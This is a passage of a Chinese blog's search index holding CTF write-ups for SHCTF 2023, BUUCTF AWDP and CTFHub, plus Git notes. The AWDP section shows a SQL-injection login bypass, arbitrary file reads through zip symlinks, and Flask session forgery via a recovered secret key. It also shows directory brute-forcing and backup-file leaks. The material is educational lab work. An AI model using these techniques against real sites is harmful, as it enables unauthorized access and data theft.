","date":"2023-11-25","objectID":"/shctf2023.10/:1:10","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2ez_ssti"},{"categories":["wp"],"content":"\rMISC","date":"2023-11-25","objectID":"/shctf2023.10/:2:0","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#misc"},{"categories":["wp"],"content":"\r[WEEK1] 真的签到扫码回复 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:1","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1-真的签到"},{"categories":["wp"],"content":"\r[WEEK1]ez-misc\r二进制转图片，扫码得到解压密码 然后 放到cyberchef里得到rockyou，使用rockyou字典进行爆破得到解压密码 得到 随后 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:2","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1ez-misc"},{"categories":["wp"],"content":"\r[WEEK1]残缺的md5 import hashlib m='KCLWG?K8M9O3?DE?84S9' for i in range(26): t1 = m.replace('?',str(chr(65+i)),1) for j in range(26): ​ t2 = t1.replace('?',str(chr(65+j)),1) ​ for h in range(26): ​ t3 = t2.replace('?',str(chr(65+h)),1) ​ s = hashlib.md5(t3.encode('utf8')).hexdigest().upper() ​ if s[:4] == 'F0AF': ​ print(s) ","date":"2023-11-25","objectID":"/shctf2023.10/:2:3","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1残缺的md5"},{"categories":["wp"],"content":"\r[WEEK1]message\r","date":"2023-11-25","objectID":"/shctf2023.10/:2:4","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1message"},{"categories":["wp"],"content":"\r[WEEK1]佛说：只能四天\r先栅栏4再rot3然后base16解码，出flag ","date":"2023-11-25","objectID":"/shctf2023.10/:2:5","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1佛说只能四天"},{"categories":["wp"],"content":"\r[WEEK1]迷雾重重\r","date":"2023-11-25","objectID":"/shctf2023.10/:2:6","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1迷雾重重"},{"categories":["wp"],"content":"\r[WEEK1]可爱的派蒙捏\r","date":"2023-11-25","objectID":"/shctf2023.10/:2:7","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1可爱的派蒙捏"},{"categories":["wp"],"content":"\r[WEEK1]请对我使用社工吧图片上有QQ号，tg盒出是东营，知道中石大在东营有个校区，就出了 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:8","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1请对我使用社工吧"},{"categories":["wp"],"content":"\r[WEEK1]签到题\r","date":"2023-11-25","objectID":"/shctf2023.10/:2:9","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1签到题"},{"categories":["wp"],"content":"\r[WEEK1]黑暗之歌\r[WEEK1]Jaeger lover steghide extract -sf Typhoon.jpg 密码是：Tri-Sun Horizon Gate 随后拿到了解压密码：.*+#1Ao/aeS 随后 K34-759183-191 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:10","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1黑暗之歌"},{"categories":["wp"],"content":"\r[WEEK1]Steganography\r将xqwed替换掉base64解出来12ercs…..909jk的点，得到解压密码，解压密码得到flag ","date":"2023-11-25","objectID":"/shctf2023.10/:2:11","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1steganography"},{"categories":["wp"],"content":"\r[WEEK1]也许需要一些py\rimport hashlib def reverse_case(s): \\# 逐个反转字符串中的大小写字母 result = [] for i in range(2 ** len(s)): ​ new_str = '' ​ for j in range(len(s)): ​ if (i \u003e\u003e j) \u0026 1: ​ new_str += s[j].lower() ​ else: ​ new_str += s[j].upper() ​ result.append(new_str) return result def calculate_md5(s): \\# 计算字符串的md5值 md5_hash = hashlib.md5() md5_hash.update(s.encode('utf-8')) return md5_hash.hexdigest() def main(): input_str = \"pNg_and_Md5_SO_GreaT\" target_md5 = \"63e62fbce22f2757f99eb7da179551d2\" variations = reverse_case(input_str) for var in variations: ​ md5 = calculate_md5(var) ​ print(f\"{var}, MD5: {md5}\") ​ if md5 == target_md5: ​ print(f\"找到匹配的结果: {var}\") ​ break if __name__ == \"__main__\": main() ","date":"2023-11-25","objectID":"/shctf2023.10/:2:12","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1也许需要一些py"},{"categories":["wp"],"content":"\r[WEEK1]电信诈骗关键词，四行七列，vivo50 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:13","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1电信诈骗"},{"categories":["wp"],"content":"\r[WEEK3]尓纬玛\r还是有点问题的，，，，把左侧区纠错，得到flag ","date":"2023-11-25","objectID":"/shctf2023.10/:2:14","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week3尓纬玛"},{"categories":["wp"],"content":"\r[WEEK2]哈希猫逐一解密应该能解出来，，，，懒得搓了 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:15","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2哈希猫"},{"categories":["wp"],"content":"\r[WEEK2]表里的码\r加粗填充为黑色，不加粗不填充，扫码得到flag ","date":"2023-11-25","objectID":"/shctf2023.10/:2:16","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2表里的码"},{"categories":["wp"],"content":"\r[WEEK2]可爱的洛琪希首先，zip未加密 然后base64解码得到jpg图片，在图片的属性信息里面的到十六进制字符串，解码得到flag 维吉尼亚解密得到flag ","date":"2023-11-25","objectID":"/shctf2023.10/:2:17","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2可爱的洛琪希"},{"categories":["wp"],"content":"\r[WEEK2]图片里的秘密Binwalk得到另一张图 盲水印提取 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:18","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2图片里的秘密"},{"categories":["wp"],"content":"\r[WEEK2]喜帖街\rsteghide extract -sf music.wav -p LeeTung 随后okk解码得到flag ","date":"2023-11-25","objectID":"/shctf2023.10/:2:19","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2喜帖街"},{"categories":["wp"],"content":"\r[WEEK2]远在天边近在眼前\r}\\4\\a\\9\\2\\b\\0\\a\\5\\7\\c\\e\\f__\\T\\H\\G\\l\\R\\I\\a_\\y\\5\\4\\e_\\Y\\l\\l\\a\\e\\r_\\s\\I_\\S\\l\\h\\7{\\g\\a\\l\\f Windows下显示不全，可以在Linux下查看 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:20","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2远在天边近在眼前"},{"categories":["wp"],"content":"\r[WEEK2]奇怪的screenshot根据文件描述和图片已知部分，可知为win的截图漏洞 https://github.com/frankthetank-music/Acropalypse-Multi-Tool?search=1利用工具修复得到完整图片，提取其中的文字进行百家姓解密得到flag 在线百家姓暗号转换 - 2048T在线工具站 ","date":"2023-11-25","objectID":"/shctf2023.10/:2:21","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week2奇怪的screenshot"},{"categories":["wp"],"content":"\rCRYPTO","date":"2023-11-25","objectID":"/shctf2023.10/:3:0","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#crypto"},{"categories":["wp"],"content":"\r[WEEK1]really_ez_rsa import gmpy2 from Crypto.Util.number import long_to_bytes p=217873395548207236847876059475581824463 q=185617189161086060278518214521453878483 c=6170206647205994850964798055359827998224330552323068751708721001188295410644 e=65537 n=p*q d= gmpy2.invert(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) ","date":"2023-11-25","objectID":"/shctf2023.10/:3:1","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1really_ez_rsa"},{"categories":["wp"],"content":"\r[WEEK1]凯撒大帝\r","date":"2023-11-25","objectID":"/shctf2023.10/:3:2","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1凯撒大帝"},{"categories":["wp"],"content":"\r[WEEK1]进制\r","date":"2023-11-25","objectID":"/shctf2023.10/:3:3","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1进制"},{"categories":["wp"],"content":"\r[WEEK1]okkhttps://www.splitbrain.org/services/ook ","date":"2023-11-25","objectID":"/shctf2023.10/:3:4","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1okk"},{"categories":["wp"],"content":"\r[WEEK1]熊斐特\r","date":"2023-11-25","objectID":"/shctf2023.10/:3:5","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1熊斐特"},{"categories":["wp"],"content":"\r[WEEK1]难言的遗憾https://www.qqxiuzi.cn/bianma/dianbao.php ","date":"2023-11-25","objectID":"/shctf2023.10/:3:6","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1难言的遗憾"},{"categories":["wp"],"content":"\r[WEEK1]小兔子可爱捏密码是42 ","date":"2023-11-25","objectID":"/shctf2023.10/:3:7","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1小兔子可爱捏"},{"categories":["wp"],"content":"\r[WEEK1]Crypto_Checkin\r","date":"2023-11-25","objectID":"/shctf2023.10/:3:8","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1crypto_checkin"},{"categories":["wp"],"content":"\r[WEEK1]what is m from Crypto.Util.number import bytes_to_long from Crypto.Util.number import inverse,long_to_bytes m = 7130439814057451252206961031070073581161360005074250134175813545291250484317873215316850120633657018292427636656594416171229024284761739178169667824242590880304270396813980988571810173170813 flag=long_to_bytes(m) flag.decode() print(flag) ","date":"2023-11-25","objectID":"/shctf2023.10/:3:9","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1what-is-m"},{"categories":["wp"],"content":"\r[WEEK1]立正\r但，，，最后没解出来 ","date":"2023-11-25","objectID":"/shctf2023.10/:3:10","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1立正"},{"categories":["wp"],"content":"\rREVERSE","date":"2023-11-25","objectID":"/shctf2023.10/:4:0","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#reverse"},{"categories":["wp"],"content":"\r[WEEK1]ez_apkJeb，base62换表 ","date":"2023-11-25","objectID":"/shctf2023.10/:4:1","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1ez_apk"},{"categories":["wp"],"content":"\r[WEEK1]signin\r","date":"2023-11-25","objectID":"/shctf2023.10/:4:2","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1signin"},{"categories":["wp"],"content":"\r[WEEK1]easy_reIda F5得到加密代码 跟进比对字符串 code = [0x66,0x0C6,0x16,0x76,0x0B7,0x45,0x27,0x97,0x0F5,0x47,0x3,0x0F5,0x37,0x3,0x0C6,0x67,0x33,0x0F5,0x47,0x86,0x56,0x0F5,0x26,0x96,0x0E6,0x16,0x27,0x97,0x0F5,0x7,0x27,0x3,0x26,0x0C6,0x33,0x0D6,0x0D7,0x1B] flag=\"\" for i in code: decrypt = ((i\u003c\u003c4)\u00260xFF)|(i\u003e\u003e4) flag += chr(decrypt) print(flag) ","date":"2023-11-25","objectID":"/shctf2023.10/:4:3","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1easy_re"},{"categories":["wp"],"content":"\rPWN","date":"2023-11-25","objectID":"/shctf2023.10/:5:0","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#pwn"},{"categories":["wp"],"content":"\r[WEEK1]hard nc\r","date":"2023-11-25","objectID":"/shctf2023.10/:5:1","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1hard-nc"},{"categories":["wp"],"content":"\r[WEEK1]nc\r","date":"2023-11-25","objectID":"/shctf2023.10/:5:2","series":null,"tags":["wp"],"title":"2023SHCTF联赛","uri":"/shctf2023.10/#week1nc"},{"categories":null,"content":"\rwanan\rwananwanan charmersix\rcss0k\ranz\rJ1Nmu\r5H064N\rkangsir\rAlphaguo\rTaosu`Home\r","date":"2023-11-18","objectID":"/links/:0:0","series":null,"tags":null,"title":"Links","uri":"/links/#"},{"categories":["notes"],"content":"一小时Git基础速成 ","date":"2023-11-18","objectID":"/git/:0:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#"},{"categories":["notes"],"content":"\r0x1版本控制在开发过长中用于管理我们对文件、目录或工程能内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。 实现跨区域多人协同开发 追踪和记载一个或多个 Git SVN CVS….. ","date":"2023-11-18","objectID":"/git/:1:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x1版本控制"},{"categories":["notes"],"content":"\r0x2版本控制分类1.本地版本控制 RCS 记录文件每次的更新，对每个版本做一个快照，适合个人使用，如RCS 2.集中式版本控制 SVN 所有的版本数据都放在服务器上，协同开发者从服务器上同步更新或上传自己的修改 3.分布式版本控制 Git 所有的版本信息都同步到本地的每个用户，本地可以查看所有版本历史，可以离线在本地提交，只需在联网时push到相应的服务器或其他用户。 ","date":"2023-11-18","objectID":"/git/:2:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x2版本控制分类"},{"categories":["notes"],"content":"\r0x3 Git启动Git Bash：Unix与Linux风格的命令行，使用最多，最推荐 Git CMD：Windows风格命令行 Git GUI：图形界面的Git，不是很建议 ","date":"2023-11-18","objectID":"/git/:3:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x3-git启动"},{"categories":["notes"],"content":"\r0x4 Git配置查看配置 git config -l 查看当前用户（global）配置 git config --global --list //用户名和密码是必须配置的 查看系统配置 git config --system --list Git相关的配置文件 (1)Git\\etc\\gitconfig Git安装目录下的gitconfig (2)c:\\User\\Administrator\\.gitconfig 只适用于当前登录用户的配置 设置用户名 git config --global user.name \"scofield\" 配置邮箱 git config --global user.email \"xxx@xxx.com\" ","date":"2023-11-18","objectID":"/git/:4:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x4-git配置"},{"categories":["notes"],"content":"\r0x5 Git基础理论","date":"2023-11-18","objectID":"/git/:5:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x5-git基础理论"},{"categories":["notes"],"content":"\r工作区域Git本地有三个工作区域，工作目录(Working Directory)、暂存区(Stage/Index)、资源库(Repository或Git Directory)。如果再加上远程的git仓库(Remote Directory)就可以分为四个工作区域。文件在这四个区域之间的转换关系如下： working：工作区，平时存放代码的地方 Index/Stage：暂存区，用于临时存放改动 Repository：仓库去（或本地仓库），安全存放数据的位置，这里有提交到所有版本的数据，其中HEAD指向最新放入仓库的版本 Remote：远程仓库，托管代码的服务器 Directory：使用Git管理的一个目录，也就是一个仓库，包含我们的工作空间和Git的管理空间 WorkSpace：需要通过Git进行版本控制的目录和文件，这些目录和文件组成了工作空间 .git：存放Git管理信息的目录，初始化仓库的时候自动创建 Index/Stage：暂存区，或者叫做待提交更新区，在提交进入repo之前，我们可以把所有的更新放在暂存区 Local Repo：本地仓库，一个存放在本地的版本库；HEAD只是当前的开发分支（branch） Stash：隐藏，是一个工作状态的保存栈，用于保存/回复WorkSpace中的临时状态 ","date":"2023-11-18","objectID":"/git/:5:1","series":null,"tags":["notes"],"title":"Git","uri":"/git/#工作区域"},{"categories":["notes"],"content":"\r工作原理1.在工作目录中添加，修改文件 2.将需要进行版本管理的文件放入暂存区域 3.将暂存区域的文件提交到git仓库 因此，git管理的文件有三种状态：已修改（modified），已暂存（staged），已提交（committed） ","date":"2023-11-18","objectID":"/git/:5:2","series":null,"tags":["notes"],"title":"Git","uri":"/git/#工作原理"},{"categories":["notes"],"content":"\r0x6 Git项目搭建创建工作目录与常用指令 工作目录（WorkSpace），建议不要有中文 本地仓库搭建 一种是创建全新仓库，另一种是克隆远程仓库 创建全新的仓库，需要使用Git管理的项目的根目录执行 git init //在当前目录新建一个Git代码库 克隆远程仓库 将远程服务器上的仓库完全镜像一份至本地 git clone [url] //克隆一个项目和它的整个代码历史(版本信息) ","date":"2023-11-18","objectID":"/git/:6:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x6-git项目搭建"},{"categories":["notes"],"content":"\r0x7 Git文件操作文件的四种状态： Untracked：未跟踪，此文件在文件夹中，但没有加入到git库，不参与版本控制，通过git add，状态变为Staged Unmodify：文件已入库，未修改，即版本库中的文件快照内容与文件夹中完全一致，这种类型的文件有两种去处，如果他被修改，而变为modified，如果使用git rm移出版本库，则成为untracked文件 Modified：文件已修改，没有进行其他操作，通过git add可进入暂存staged状态，使用git checkout则丢弃修改过的，返回unmodify的状态，即从库中取出文件，覆盖当前修改 Staged：暂存状态，执行git commit则将修改同步到库中，这时库中的文件和本地文件又变为一致，文件为Unmodify状态，执行git reset HEAD filename取消暂存，文件状态为Modified ","date":"2023-11-18","objectID":"/git/:7:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x7-git文件操作"},{"categories":["notes"],"content":"\r查看文件状态 #查看指定文件状态 git status [filename] #查看所有文件状态 git status #git add . 添加所有文件到暂存区 #git commit -m \"消息内容\" 提交暂存区中的文件内容到本地仓库 -m 提交信息 ","date":"2023-11-18","objectID":"/git/:7:1","series":null,"tags":["notes"],"title":"Git","uri":"/git/#查看文件状态"},{"categories":["notes"],"content":"\r忽略文件有时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件等 在主目录下建立\".gitignore\"文件，此文件有如下规则： 忽略文件中的空行或以井号（#）开始的行 可以使用Linux通配符 如果名称最前面有一个感叹号（!），表示例外规则，将不被忽略 如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略 如果名称最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件 #为注释 !lib.txt #lib.txt文件除外 /temp #进忽略项目根目录下的文件，不包括其他目录temp build/ #忽略build/目录下的所有文件 ","date":"2023-11-18","objectID":"/git/:7:2","series":null,"tags":["notes"],"title":"Git","uri":"/git/#忽略文件"},{"categories":["notes"],"content":"\r注册github略 ","date":"2023-11-18","objectID":"/git/:7:3","series":null,"tags":["notes"],"title":"Git","uri":"/git/#注册github"},{"categories":["notes"],"content":"\r设置本机绑定ssh公钥实现免密登录 #进入C:\\User\\Administrator\\.ssh 目录 #生成公钥 ssh-keygen 随后将公钥信息public key添加到github即可 ","date":"2023-11-18","objectID":"/git/:7:4","series":null,"tags":["notes"],"title":"Git","uri":"/git/#设置本机绑定ssh公钥"},{"categories":["notes"],"content":"\r0x8 Git分支\rgit分支中常用命令： #列出所有本地分支 git branch #列出所有远程分支 git branch -r #新建一个分支，但依然停留在当前分支 git branch [branch_name] #新建一个分支，并切换到该分支 git checkout -b [branch] #合并指定分支到当前分支 git merge [branch] #删除分支 git branch -d [branch_name] #删除远程分支 git push origin --delete [branch_name] git branch -dr [remote/branch] ","date":"2023-11-18","objectID":"/git/:8:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x8-git分支"},{"categories":["notes"],"content":"\r0x9 git挂代理​ Git代理有两种设置方式，分别是全局代理和只对Github代理，建议只对github 代理。 代理协议也有两种，分别是使用http代理和使用socks5代理，建议使用socks5代理。 注意下面代码的端口号需要根据你自己的代理端口设定，比如我的代理socks端口是6987. 全局设置（不推荐） #使用http代理 git config --global http.proxy http://127.0.0.1:58591 git config --global https.proxy https://127.0.0.1:58591 #使用socks5代理 git config --global http.proxy socks5://127.0.0.1:51837 git config --global https.proxy socks5://127.0.0.1:51837 只设置 Github 的代理 git config --global http.https://github.com.proxy socks5://127.0.0.1:6986 git config --global https.https://github.com.proxy socks5://127.0.0.1:6986 取消代理 git config --global --unset http.proxy git config --global --unset https.proxy 参考： https://blog.csdn.net/qq_33406021/article/details/130199208 ","date":"2023-11-18","objectID":"/git/:9:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x9-git挂代理"},{"categories":["web","awdp"],"content":"两道awdp-web加固题 ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:0:0","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#"},{"categories":["web","awdp"],"content":"\r[Ezsql]\r","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:1:0","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#ezsql"},{"categories":["web","awdp"],"content":"\r1.break首先进入靶机web页面 猜了弱口令都不对，尝试sql万能密码成功登录 用户名：admin' or 1=1# 密码：(填不填都行，填啥也行) 题目要求对页面存在的sql注入漏洞进行加固，即可取得flag ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:1:1","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#1break"},{"categories":["web","awdp"],"content":"\r2.fix根据题目给的地址端口以及用户名，ssh连接至靶机，进入/var/www/html/目录 在此处新建一个phpinfo.php并写入语句 \u003c?php phpinfo(); ?\u003e 访问phpinfo.php可以看到当前php版本为7.3.18 php中防止sql注入的函数无非就那么几个：（我所知道的） addslashes() mysql_real_escape_string() 在php5.5中已经弃用，并在php7中被删除 mysql_escape_string() PHP 4 \u003e= 4.0.3, PHP 5 在PHP7中，能用的只有addslashes() 故应在index.php中添加以下代码 $username = addslashes($username); $password = addslashes($password); 添加在此处： 随后进入check服务器/check目录进行check 通过之后访问/flag得到flag字符串 ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:1:2","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#2fix"},{"categories":["web","awdp"],"content":"\r[babypython]\r","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:2:0","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#babypython"},{"categories":["web","awdp"],"content":"\r1.break进入靶机web页面，是个上传界面，经过尝试后发现只能上传zip文件，猜测是通过上传软链接的压缩包来读取相关信息（压缩一个软链接，类似于windows下的快捷方式，然后网站后台会解压读取该软链接指向的服务器上的文件，就能达到读取任意文件的效果。） 在Linux环境下： ln -s /etc/passwd passwd zip -y passwd.zip passwd 生成了一个读取**/etc/passwd的zip软链接 随后上传我们得到的压缩包passwd.zip便可以在web页面看到回显的passwd文件信息 再来读取下app/uwsgi.ini uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议 读一下**/app/main.py** 最终找到源码文件：/app/y0u_found_it/y0u_found_main.py app.config[‘SECRET_KEY’] = str(random.random()*100) random.seed(uuid.getnode()) 设置随机数种子操作。 python random 生成的数是伪随机数 uuid.getnode() 这个函数可以获取网卡mac地址并转换成十进制数返回 通过读/sys/class/net/eth0/address文件得到mac地址，于是构造软链接、生成zip、上传看返回结果。 然后就是把mac地址处理下，转换成二进制，然后设置成seed，生成一下KEY import uuid import random mac = \"c6:98:94:10:39:c6\" temp = mac.split(':') #去掉\":\" temp = [int(i,16) for i in temp] #遍历mac temp = [bin(i).replace('0b','').zfill(8) for i in temp] #十六进制转二 temp = ''.join(temp) #得到的值赋给temp mac = int(temp,2) random.seed(mac) #将mac作为种子 randStr = str(random.random()*100) print(randStr) 得到KEY:68.61339598479617 同时根据页面提示，只有admin才能获得flag，尝试通过伪造session来伪造admin身份用flask-session-cookie-manager伪造session C:\\Users\\Scofield_Lee\\Desktop\\flask-session-cookie-manager\u003epython flask_session_cookie_manager3.py encode -s '68.61339598479617' -t \"{'username': 'admin'}\" eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w 得到session：eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:2:1","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#1break-1"},{"categories":["web","awdp"],"content":"\r2.fix。。。。。 ","date":"2023-11-17","objectID":"/buuctf_reinforce_wp/:2:2","series":null,"tags":["web","awdp"],"title":"BUUCTF awdp加固题","uri":"/buuctf_reinforce_wp/#2fix-1"},{"categories":["web"],"content":"早期做CTFHub的入门题wp ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:0","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#"},{"categories":["web"],"content":"\r【目录遍历】emm挨着找吧 【PHPINFO】ctrl+f，搜索flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:1","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#目录遍历"},{"categories":["web"],"content":"\r【目录遍历】emm挨着找吧 【PHPINFO】ctrl+f，搜索flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:1","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#phpinfo"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#备份文件下载"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#网站源码"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag ","date":"2023-11-17","objectID":"/ctfhub--info_leakage/:0:2","series":null,"tags":["web","wp"],"title":"ctfhub_信息泄露wp","uri":"/ctfhub--info_leakage/#-bak文件"},{"categories":["web"],"content":"\r【备份文件下载】\r（网站源码） python dirsearch.py -u http://challenge-386c567a8c9e211f.sandbox.ctfhub.com:10800/ -e * （ bak文件）bak文件是备份文件，一般在原有的扩展名后添加.bak，提示说flag在index.php源码中，但我们直接在网址后添加php文件名查找时发现并未找到该文件 （vim缓存）当正常关闭vim时，缓存文件会被删除，但当vim异常退出时，缓存文件是未被删除的，我们就可以通过恢复未被处理缓存文件来获取原始文件的内容。第一次非正常退出vim时会生成一个swp文件，第二次非正常退出会生成一个swp文件，第三次非正常退出会生成一个swp文件。因此我们可以通过访问.index.php.swp来得到缓存文件 使用vim -r index.php.swp命令来恢复原文件 (.DS_Store)直接在网址后添加.DS_Store得到文件 使用cat DS_Store命令来查看文件，发现了一个txt文件 把这个文件复制下来添加到地址后得到flag 